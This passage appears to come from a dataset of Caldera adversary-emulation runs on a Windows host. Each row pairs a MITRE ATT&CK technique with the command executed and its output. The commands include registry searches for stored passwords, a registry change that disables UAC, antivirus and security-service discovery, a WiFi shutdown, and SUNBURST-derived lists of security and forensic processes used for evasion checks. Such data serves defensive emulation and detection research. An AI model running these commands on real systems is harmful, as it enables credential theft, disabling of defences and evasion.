(Default)    REG_SZ    RASGCW Change Password PageHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{3bfe6eb7-281d-4333-999e-e949e3621de7}    (Default)    REG_SZ    Cert Password UI PageHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{9cb233a5-a4a5-46b9-ab13-db07ce949410}    (Default)    REG_SZ    Password retry UI PageHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}    (Default)    REG_SZ    WCN Password - PINHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\\Children\\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}    (Default)    REG_SZ    WCN Password PINHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{d9162b5b-ca81-476e-a310-cb32d932733c}    (Default)    REG_SZ    Password Expired UI PageHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsRuntime\\ActivatableClassId\\Windows.Internal.Shell.PlatformExtensions.PasswordEnrollment.PasswordEnrollmentManager    DllPath    REG_SZ    C:\\Windows\\System32\\PasswordEnrollmentManager.dllHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Internet Explorer\\Capabilities\\Roaming\\FormSuggest    FilterIn    REG_SZ    FormSuggest Passwords,Use FormSuggest,FormSuggest PW AskHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}    (Default)    REG_SZ    PicturePasswordLogonProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}    (Default)    REG_SZ    PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\SO\\AUTH\\LOGON\\ASK    Text    REG_SZ    Prompt for user name and passwordHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\SO\\AUTH\\LOGON\\SILENT    Text    REG_SZ    Automatic logon with current user name and passwordHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}    (Default)    REG_SZ    RASGCW Change Password PageHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{3bfe6eb7-281d-4333-999e-e949e3621de7}    (Default)    REG_SZ    Cert Password UI PageHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{9cb233a5-a4a5-46b9-ab13-db07ce949410}    (Default)    REG_SZ    Password retry UI PageHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}    (Default)    REG_SZ    WCN Password - PINHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{C100BEEB-D33A-4A4B-BF23-BBEF4663D017}\\Children\\{C100BED7-D33A-4A4B-BF23-BBEF4663D017}    (Default)    REG_SZ    WCN Password PINHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\XWizards\\Components\\{d9162b5b-ca81-476e-a310-cb32d932733c}    (Default)    REG_SZ    Password Expired UI PageHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}    (Default)    REG_SZ    PicturePasswordLogonProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{29EA1611-529B-4113-8EE3-EE0F6DD2C715}    (Default)    REG_SZ    RASGCW Change Password ClassHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{2DE92DB3-CD3E-4ad6-80F9-089036E1C81E}    (Default)    REG_SZ    CLSID_HomeGroupRoamedPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{3bfe6eb7-281d-4333-999e-e949e3621de7}    (Default)    REG_SZ    Cert Password UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}    (Default)    REG_SZ    PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\\ProgID    (Default)    REG_SZ    IAS.ChangePassword.1HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\\VersionIndependentProgID    (Default)    REG_SZ    IAS.ChangePasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}    (Default)    REG_SZ    V1PasswordProviderHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{7A9D77BD-5403-11d2-8785-2E0420524153}    InfoTip    REG_SZ    Manages users and passwords for this computerHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{7be73787-ce71-4b33-b4c8-00d32b54bea8}    (Default)    REG_SZ    HomeGroup PasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}    (Default)    REG_SZ    LogonPasswordResetHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{9cb233a5-a4a5-46b9-ab13-db07ce949410}    (Default)    REG_SZ    Password retry UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{B4FB3F98-C1EA-428d-A78A-D1F5659CBA93}\\shell    (Default)    REG_SZ    changehomegroupsettings viewhomegrouppassword starthomegrouptroubleshooter sharewithdevicesHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{C98F3822-3658-4D75-8A25-6621665ECD56}    (Default)    REG_SZ    HomeGroup Password CommandHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\CLSID\\{d9162b5b-ca81-476e-a310-cb32d932733c}    (Default)    REG_SZ    Password Expired UI classHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{06F5AD81-AC49-4557-B4A5-D7E9013329FC}    (Default)    REG_SZ    IHomeGroupPasswordHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{1853A283-130E-427E-BED0-ACDEA5872DDD}    (Default)    REG_SZ    IProvideUserNameAndPasswordAssociationResponseHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{3CD62D67-586F-309E-A6D8-1F4BAAC5AC28}    (Default)    REG_SZ    _PasswordDeriveBytesHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{4557D1F9-A47E-5A8A-B6F2-74B42EF7F09E}    (Default)    REG_SZ    __FITypedEventHandler_2_WebRuntime__CBrowsingContext_WebRuntime__CAutoPasswordPermissionRequestedEventArgsHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{46ACA899-50F6-4A46-A9E3-273705CA4914}    (Default)    REG_SZ    IPicturePasswordTaskHandlerHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{53E78940-B62E-49F8-A69B-84CB8963A513}    (Default)    REG_SZ    IPasswordOnWakeSettingHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{61fd2c0b-c8d4-48c1-a54f-bc5a64205af2}    (Default)    REG_SZ    IPasswordVaultHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{68FFF241-CA49-4754-A3D8-4B4127518549}    (Default)    REG_SZ    ISupportPasswordModeHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{6ab18989-c720-41a7-a6c1-feadb36329a0}    (Default)    REG_SZ    IPasswordCredentialHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{72E67CC9-004E-50A5-A2FF-CD1DD5BB4707}    (Default)    REG_SZ    __FITypedEventHandler_2_Windows__CInternal__CUI__CAuth__CEnrollment__CPasswordCredentialEnrollment_IInspectableHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{97F17EF9-284E-4992-AE46-748EF75225BB}    (Default)    REG_SZ    __x_ABI_CWebRuntime_CIAutoPasswordPermissionRequestedEventArgsHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{a1ac5012-3c00-5b22-adc1-095f7e86ca11}    (Default)    REG_SZ    __FIVectorView_1_Windows__CSecurity__CCredentials__CIPasswordCredentialHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{B350F361-BEF5-4F75-AA88-1C2870BDA397}    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPicturePasswordCredentialEnrollmentHKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Classes\\Interface\\{CF9DA5AD-59AA-414D-9223-CD5F12E31119}    (Default)    REG_SZ    __x_Windows_CInternal_CUI_CAuth_CEnrollment_CIPasswordCredentialEnrollmentHKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\DefaultUserConfiguration    Password    REG_SZ    HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\WinStations\\RDP-Tcp    Password    REG_SZ    HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\RemoteAccess\\Policy\\Pipeline\\23    (Default)    REG_SZ    IAS.ChangePasswordHKEY_LOCAL_MACHINE\\SYSTEM\\DriverDatabase\\DriverPackages\\ehstorpwddrv.inf_amd64_34a7edda13312775\\Strings    devicename    REG_SZ    Microsoft supported IEEE 1667 password siloHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\DefaultUserConfiguration    Password    REG_SZ    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp    Password    REG_SZ    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess\\Policy\\Pipeline\\23    (Default)    REG_SZ    IAS.ChangePasswordEnd of search: 304 match(es) found.']",[''],['0'],['reg query HKLM /f password /t REG_SZ /s'],['Search for possible credentials stored in the HKLM Hive'],['Credentials in Registry - HKLM'],"[{'tactic': 'credential-access', 'technique_name': 'Unsecured Credentials: Credentials in Registry', 'technique_id': 'T1552.002'}]",['windows'],['psh']
4,Initial-Success,credential-access,credential-access :: Unsecured Credentials: Credentials in Registry,credential-access :: ['Credentials in Registry - HKCU'],credential-access :: T1552.002,operation__stockpile_windows_depfalse_pshtrue__t1552_002__credential-access__unsecured_credentials-_credentials_in_registry__3aad5312-d48b-4206-9de4-39866c12e60f__SAVED_2024-03-10_104923,stockpile_windows_depfalse_pshtrue__t1552_002__credential-access__unsecured_credentials-_credentials_in_registry__3aad5312-d48b-4206-9de4-39866c12e60f,['3aad5312-d48b-4206-9de4-39866c12e60f'],1,1,1,[0],"['HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Winlogon\\PasswordExpiryNotification    NotShownReason    REG_SZ    PasswordNeverExpiresHKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\ImmutableMuiCache\\Strings\\52C64B7E    @C:\\WINDOWS\\System32\\usercpl.dll,-2#immutable1    REG_SZ    Change user account settings and passwords for people who share this computer.HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\MrtCache\\C:%5CWindows%5CSystemResources%5CWindows.UI.SettingsAppThreshold%5CWindows.UI.SettingsAppThreshold.pri\\1d9fc83ff0cdffd\\326bcf6e    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SettingsGroupPasswordLessSignIn/Description}    REG_SZ    Make your device password-less    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SettingsGroupPasswordLessSignIn/HighKeywords}    REG_SZ    passwordless settings;password less settings;sign in options;signin options;sign in settings;signin settings;hide my password;no password settings    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SettingsPageSignInOptions-2/HighKeywords}    REG_SZ    account settings;accounts;biocredentials;bio-credentials;biocreds;change my password;change password;FIDO keys;fingerprint settings;login settings;password settings;passwords settings;photo password;picture password;pictures password;require sign in;security key settings;security keys settings;sign in options;signin options;signin settings;sign-in settings;Windows Hello Face;Windows Hello Fingerprint;Windows Hello PIN;Windows Hello settings;set up windows hello;windows hello setup;log on;logon    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SettingsPageSignInOptions/HighKeywords}    REG_SZ    account settings;accounts;biocredentials;bio-credentials;biocreds;change my password;change password;FIDO keys;fingerprint settings;login settings;password settings;passwords settings;photo password;picture password;pictures password;require sign in;security key settings;security keys settings;sign in options;signin options;signin settings;sign-in settings;Windows Hello Face;Windows Hello Fingerprint;Windows Hello PIN;Windows Hello settings    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/Description}    REG_SZ    Sync your passwords on this PC    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_SyncSettings_SyncCredentials_Toggle/HighKeywords}    REG_SZ    password;sync settings;sync passwords;sync my passwords    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_EnrollmentPassword/Description}    REG_SZ    Change your password    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_EnrollmentPassword/HighKeywords}    REG_SZ    sign-in options;sign-in settings;signin settings;signin options;sign in options;sign in settings;change my password;change password;set password;set your password;set my password;password settings;passwords    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_EnrollmentPicturePassword/Description}    REG_SZ    Set up a picture password sign-in    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_EnrollmentPicturePassword/HighKeywords}    REG_SZ    picture password settings;pictures password settings;photo password settings;photos password settings;sign-in options;sign-in settings;signin settings;signin options;sign in options;sign in settings;setup picture password;set up picture password;setup photo password;set up photo password;change picture password;change photo password    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PasswordLessSignIn/Description}    REG_SZ    Passwordless Sign-in toggle    @{windows?ms-resource://Windows.UI.SettingsAppThreshold/SearchResources/SystemSettings_Users_PasswordLessSignIn/HighKeywords}    REG_SZ    passwordless settings;password less settings;sign in options;signin options;sign in settings;signin settings;hide my password;no password settingsHKEY_CURRENT_USER\\SOFTWARE\\Classes\\Local Settings\\MuiCache\\d1\\52C64B7E    @C:\\WINDOWS\\System32\\fvewiz.dll,-971    REG_SZ    Change BitLocker passwordEnd of search: 22 match(es) found.']",[''],['0'],['reg query HKCU /f password /t REG_SZ /s'],['Search for possible credentials stored in Registry'],['Credentials in Registry - HKCU'],"[{'tactic': 'credential-access', 'technique_name': 'Unsecured Credentials: Credentials in Registry', 'technique_id': 'T1552.002'}]",['windows'],['psh']
8,Initial-Success,privilege-escalation,privilege-escalation :: Abuse Elevation Control Mechanism: Bypass User Access Control,privilege-escalation :: ['UAC bypass registry'],privilege-escalation :: T1548.002,operation__stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__665432a4-42e7-4ee1-af19-a9a8c9455d0c__SAVED_2024-03-10_101355,stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__665432a4-42e7-4ee1-af19-a9a8c9455d0c,['665432a4-42e7-4ee1-af19-a9a8c9455d0c'],1,1,1,[0],['EnableLUA    : 0PSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policie               s\\systemPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policie               sPSChildName  : systemPSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry'],[''],['0'],['New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force'],['Set a registry key to allow UAC bypass'],['UAC bypass registry'],"[{'tactic': 'privilege-escalation', 'technique_name': 'Abuse Elevation Control Mechanism: Bypass User Access Control', 'technique_id': 'T1548.002'}]",['windows'],['psh']
9,Initial-Success,discovery,discovery :: Software Discovery,discovery :: ['Internet Explorer Version'],discovery :: T1518,operation__stockpile_windows_depfalse_pshtrue__t1518__discovery__software_discovery__c9be8043-a445-4cbf-b77b-ed7bb007fc7c__SAVED_2024-03-10_100504,stockpile_windows_depfalse_pshtrue__t1518__discovery__software_discovery__c9be8043-a445-4cbf-b77b-ed7bb007fc7c,['c9be8043-a445-4cbf-b77b-ed7bb007fc7c'],1,1,1,[0],['9.11.19041.0'],[''],['0'],"[""(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version""]",['Determine the version of Internet Explorer running'],['Internet Explorer Version'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery', 'technique_id': 'T1518'}]",['windows'],['psh']
10,Initial-Success,discovery,discovery :: Software Discovery: Security Software Discovery,discovery :: ['Identify Firewalls'],discovery :: T1518.001,operation__stockpile_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__8c06ebf8-bacf-486b-bd77-21ba8c5a5777__SAVED_2024-03-10_095611,stockpile_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__8c06ebf8-bacf-486b-bd77-21ba8c5a5777,['8c06ebf8-bacf-486b-bd77-21ba8c5a5777'],1,1,1,[0],"['DisplayName              : Windows DefenderInstanceGuid             : {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}PathToSignedProductExe   : windowsdefender://PathToSignedReportingExe : %ProgramFiles%\\Windows Defender\\MsMpeng.exeProductState             : 401664Timestamp                : Fri, 08 Mar 2024 17:46:35 GMT']",[''],['0'],"['$NameSpace = Get-WmiObject -Namespace ""root"" -Class ""__Namespace"" | Select Name | Out-String -Stream | Select-String ""SecurityCenter"";$SecurityCenter = $NameSpace | Select-Object -First 1;Get-WmiObject -Namespace ""root\\$SecurityCenter"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;']",['Identify Firewalls'],['Identify Firewalls'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}]",['windows'],['psh']
12,Initial-Success,discovery,discovery :: Software Discovery: Security Software Discovery,discovery :: ['Discover antivirus programs'],discovery :: T1518.001,operation__stockpile_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__2dece965-37a0-4f70-a391-0f30e3331aba__SAVED_2024-03-10_010913,stockpile_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__2dece965-37a0-4f70-a391-0f30e3331aba,['2dece965-37a0-4f70-a391-0f30e3331aba'],1,1,1,[0],"['\r\rdisplayName=Windows Defender\rinstanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}\rpathToSignedProductExe=windowsdefender://\rpathToSignedReportingExe=%ProgramFiles%\\Windows Defender\\MsMpeng.exe\rproductState=401664\rtimestamp=Fri, 08 Mar 2024 17:46:35 GMT\r\r\r\r']",[''],['0'],['wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value'],['Identify AV'],['Discover antivirus programs'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}]",['windows'],['psh']
13,Initial-Success,impact,impact :: Endpoint Denial of Service,impact :: ['Disrupt WIFI'],impact :: T1499,operation__stockpile_windows_depfalse_pshtrue__t1499__impact__endpoint_denial_of_service__2fe2d5e6-7b06-4fc0-bf71-6966a1226731__SAVED_2024-03-10_005503,stockpile_windows_depfalse_pshtrue__t1499__impact__endpoint_denial_of_service__2fe2d5e6-7b06-4fc0-bf71-6966a1226731,['2fe2d5e6-7b06-4fc0-bf71-6966a1226731'],1,1,1,[0],['Turning WIFI offNo more data is available.'],[''],['0'],['.\\wifi.ps1 -Off'],['Turn a computers WIFI off'],['Disrupt WIFI'],"[{'tactic': 'impact', 'technique_name': 'Endpoint Denial of Service', 'technique_id': 'T1499'}]",['windows'],['psh']
15,Initial-Success,discovery,discovery :: Virtualization/Sandbox Evasion: System Checks,discovery :: ['Virtual or Real'],discovery :: T1497.001,"operation__stockpile_windows_depfalse_pshtrue__t1497_001__discovery__virtualization,sandbox_evasion-_system_checks__5dc841fd-28ad-40e2-b10e-fb007fe09e81__SAVED_2024-03-10_003129","stockpile_windows_depfalse_pshtrue__t1497_001__discovery__virtualization,sandbox_evasion-_system_checks__5dc841fd-28ad-40e2-b10e-fb007fe09e81",['5dc841fd-28ad-40e2-b10e-fb007fe09e81'],1,1,1,[0],"['model : Standard PC (Q35 + ICH9, 2009)']",[''],['0'],['get-wmiobject win32_computersystem | fl model'],['Determine if the system is virtualized or physical'],['Virtual or Real'],"[{'tactic': 'discovery', 'technique_name': 'Virtualization/Sandbox Evasion: System Checks', 'technique_id': 'T1497.001'}]",['windows'],['psh']
16,Initial-Success,defense-evasion,defense-evasion :: Virtualization/Sandbox Evasion: System Checks,defense-evasion :: ['Check Security Services'],defense-evasion :: T1497.001,"operation__stockpile_windows_depfalse_pshtrue__t1497_001__defense-evasion__virtualization,sandbox_evasion-_system_checks__1258b063-27d6-489b-a677-4807faacf868__SAVED_2024-03-10_001340","stockpile_windows_depfalse_pshtrue__t1497_001__defense-evasion__virtualization,sandbox_evasion-_system_checks__1258b063-27d6-489b-a677-4807faacf868",['1258b063-27d6-489b-a677-4807faacf868'],1,1,1,[0],['[!] Security service found:    Service Name:\t Sense    Display Name:\t Windows Defender Advanced Threat Protection Service    Status:\t\t Stopped[!] Security service found:    Service Name:\t WinDefend    Display Name:\t Microsoft Defender Antivirus Service    Status:\t\t Running'],[''],['0'],"['$securityServices = @(    ""msmpeng"",    ""windefend"",    ""mssense"",    ""sense"",    ""microsoft.tri.sensor"",    ""microsoft.tri.sensor.updater"",    ""cavp"",    ""cb"",    ""carbonblack"",    ""carbonblackk"",    ""cbcomms"",    ""cbstream"",    ""csfalconservice"",    ""csfalconcontainer"",    ""csagent"",    ""csdevicecontrol"",    ""csfalconservice"",    ""xagt"",    ""xagtnotif"",    ""fe_avk"",    ""fekern"",    ""feelam"",    ""fewscservice"",    ""ekrn"",    ""eguiproxy"",    ""egui"",    ""eamonm"",    ""eelam"",    ""ehdrv"",    ""ekrnepfw"",    ""epfwwfp"",    ""ekbdflt"",    ""epfw"",    ""fsgk32st"",    ""fswebuid"",    ""fsgk32"",    ""fsma32"",    ""fssm32"",    ""fnrb32"",    ""fsaua"",    ""fsorsp"",    ""fsav32"",    ""f-secure gatekeeper handler starter"",    ""f-secure network request broker"",    ""f-secure webui daemon"",    ""fsma"",    ""fsorspclient"",    ""f-secure gatekeeper"",    ""f-secure hips"",    ""fsbts"",    ""fsni"",    ""fsvista"",    ""f-secure filter"",    ""f-secure recognizer"",    ""fses"",    ""fsfw"",    ""fsdfw"",    ""fsms"",    ""fsdevcon"");$currentServices = Get-Service | Select-Object -Property Name;foreach ($svc in $currentServices) {    foreach ($secSvc in $securityServices) {        if ($svc.Name -like $secSvc) {            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;            Write-Host ""[!] Security service found:"";            Write-Host ""    Service Name:`t"", $svcDetails.Name;            Write-Host ""    Display Name:`t"", $svcDetails.DisplayName;            Write-Host ""    Status:`t`t"", $svcDetails.Status;            Write-Host """";        }    }}']",['Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).'],['Check Security Services'],"[{'tactic': 'defense-evasion', 'technique_name': 'Virtualization/Sandbox Evasion: System Checks', 'technique_id': 'T1497.001'}]",['windows'],['psh']
17,Initial-Success,defense-evasion,defense-evasion :: Virtualization/Sandbox Evasion: System Checks,defense-evasion :: ['Check analysis environment processes'],defense-evasion :: T1497.001,"operation__stockpile_windows_depfalse_pshtrue__t1497_001__defense-evasion__virtualization,sandbox_evasion-_system_checks__7a6ba833-de40-466a-8969-5c37b13603e0__SAVED_2024-03-10_002237","stockpile_windows_depfalse_pshtrue__t1497_001__defense-evasion__virtualization,sandbox_evasion-_system_checks__7a6ba833-de40-466a-8969-5c37b13603e0",['7a6ba833-de40-466a-8969-5c37b13603e0'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$forensicProcesses = @(    ""apimonitor-x64"",    ""apimonitor-x86"",    ""autopsy64"",    ""autopsy"",    ""autoruns64"",    ""autoruns"",    ""autorunsc64"",    ""autorunsc"",    ""binaryninja"",    ""blacklight"",    ""cff explorer"",    ""cutter"",    ""de4dot"",    ""debugview"",    ""diskmon"",    ""dnsd"",    ""dnspy"",    ""dotpeek32"",    ""dotpeek64"",    ""dumpcap"",    ""evidence center"",    ""exeinfope"",    ""fakedns"",    ""fakenet"",    ""ffdec"",    ""fiddler"",    ""fileinsight"",    ""floss"",    ""gdb"",    ""hiew32demo"",    ""hiew32"",    ""hollows_hunter"",    ""idaq64"",    ""idaq"",    ""idr"",    ""ildasm"",    ""ilspy"",    ""jd-gui"",    ""lordpe"",    ""officemalscanner"",    ""ollydbg"",    ""pdfstreamdumper"",    ""pe-bear"",    ""pebrowse64"",    ""peid"",    ""pe-sieve32"",    ""pe-sieve64"",    ""pestudio"",    ""peview"",    ""ppee"",    ""procdump64"",    ""procdump"",    ""processhacker"",    ""procexp64"",    ""procexp"",    ""procmon"",    ""prodiscoverbasic"",    ""py2exedecompiler"",    ""r2agent"",    ""rabin2"",    ""radare2"",    ""ramcapture64"",    ""ramcapture"",    ""reflector"",    ""regmon"",    ""resourcehacker"",    ""retdec-ar-extractor"",    ""retdec-bin2llvmir"",    ""retdec-bin2pat"",    ""retdec-config"",    ""retdec-fileinfo"",    ""retdec-getsig"",    ""retdec-idr2pat"",    ""retdec-llvmir2hll"",    ""retdec-macho-extractor"",    ""retdec-pat2yara"",    ""retdec-stacofin"",    ""retdec-unpacker"",    ""retdec-yarac"",    ""rundotnetdll"",    ""sbiesvc"",    ""scdbg"",    ""scylla_x64"",    ""scylla_x86"",    ""shellcode_launcher"",    ""solarwindsdiagnostics"",    ""sysmon64"",    ""sysmon"",    ""task explorer"",    ""task explorer-x64"",    ""tcpdump"",    ""tcpvcon"",    ""tcpview"",    ""vboxservice"",    ""win32_remote"",    ""win64_remotex64"",    ""windbg"",    ""windump"",    ""winhex64"",    ""winhex"",    ""winobj"",    ""wireshark"",    ""x32dbg"",    ""x64dbg"",    ""xwforensics64"",    ""xwforensics"",    ""redcloak"",    ""avgsvc"",    ""avgui"",    ""avgsvca"",    ""avgidsagent"",    ""avgsvcx"",    ""avgwdsvcx"",    ""avgadminclientservice"",    ""afwserv"",    ""avastui"",    ""avastsvc"",    ""aswidsagent"",    ""aswidsagenta"",    ""aswengsrv"",    ""avastavwrapper"",    ""bccavsvc"",    ""psanhost"",    ""psuaservice"",    ""psuamain"",    ""avp"",    ""avpui"",    ""ksde"",    ""ksdeui"",    ""tanium"",    ""taniumclient"",    ""taniumdetectengine"",    ""taniumendpointindex"",    ""taniumtracecli"",    ""taniumtracewebsocketclient64"");function Find-ForensicProcesses {    param (        $ForensicProcessList    );    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;    foreach ($proc in $CurrentProcesses) {        foreach ($forensicProc in $ForensicProcessList) {            if ($proc.name -like $forensicProc) {                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;                Write-Host ""[!] Forensic process found: "" $proc.Name;                Write-Host ""[!] Path: "" $procPath.Path;            }        }    }}Find-ForensicProcesses($forensicProcesses);']",['Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).'],['Check analysis environment processes'],"[{'tactic': 'defense-evasion', 'technique_name': 'Virtualization/Sandbox Evasion: System Checks', 